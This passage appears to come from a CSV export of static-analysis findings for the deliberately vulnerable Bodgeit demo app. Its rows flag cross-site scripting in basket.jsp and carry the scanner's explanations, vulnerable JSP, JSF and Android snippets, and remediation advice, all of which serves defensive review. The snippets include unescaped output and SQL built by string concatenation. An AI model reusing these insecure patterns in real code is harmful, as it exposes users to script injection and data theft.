&lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","218","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA,Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/basket.jsp","","","http://localhost/root/basket.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","234","Cross-Site Scripting: Reflected","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/basket.jsp","cookie","","http://localhost/root/basket.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP request, then checks the value for this key in bundle. If the key doesn't exist, the default functionality is to print the key to the user. <pre> &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee ID: &lt;fmt:message key=""${param.eid}"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> </Paragraph></IfDef> The code in this example operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> 